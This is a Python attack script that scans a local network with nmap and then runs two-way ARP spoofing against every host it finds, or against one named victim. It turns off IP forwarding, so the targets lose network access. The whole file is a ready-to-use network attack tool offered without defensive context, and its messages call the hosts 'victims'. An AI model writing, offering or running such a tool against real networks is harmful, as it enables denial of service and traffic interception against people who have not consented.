#!/usr/bin/python3


import os
import sys
import nmap3
import threading


interface = sys.argv[1]
router_ip = sys.argv[2]
victims = []


class terminalThread(threading.Thread):
	def __init__(self, command):
		threading.Thread.__init__(self)
		self.command = command

	def run(self):
		os.system(self.command)


def attack(ips):
	for ip in ips:
		thr1 = terminalThread(f"arpspoof -i {interface} -t {ip} {router_ip}")
		thr2 = terminalThread(f"arpspoof -i {interface} -t {router_ip} {ip}")

		thr1.start()
		thr2.start()

		thr1.join()
		thr2.join()


def disable_ip_forward():
	os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")


def scanner(ip):
	global victims

	nmap = nmap3.NmapHostDiscovery()
	victims = nmap.nmap_no_portscan(ip)["hosts"]
	result = []

	print("")
	for element in victims:
		addr = element["addr"]
		if addr != router_ip:
			result.append(addr)
			print(" -- " + addr)

	if len(result) < 1:
		print("No computers were found on the local network, try again.")
		raise SystemExit
	else:
		print("")
		answer = input("Continue? [Y/n] ")

		if answer.lower() != 'y':
			raise SystemExit

	victims = result
	return victims


def main():
	print("Setting IP forward on your PC..")
	disable_ip_forward()

	try:
		victims.append(sys.argv[3])

		nmap = nmap3.NmapHostDiscovery()
		result = nmap.nmap_no_portscan(sys.argv[3])

		if len(result["hosts"]) > 0:
			print("The only victim exposed", sys.argv[3])
		else:
			print("Host " + sys.argv[3] + " not found.")
			raise KeyboardInterrupt

	except IndexError:
		print("Scanning computers in local network..")
		scanner("192.168.1.0/24")

	print("Running the attack..")
	attack(victims)


if __name__== "__main__":
	try:
		main()
	except KeyboardInterrupt:
		print("Attack was stopped.")



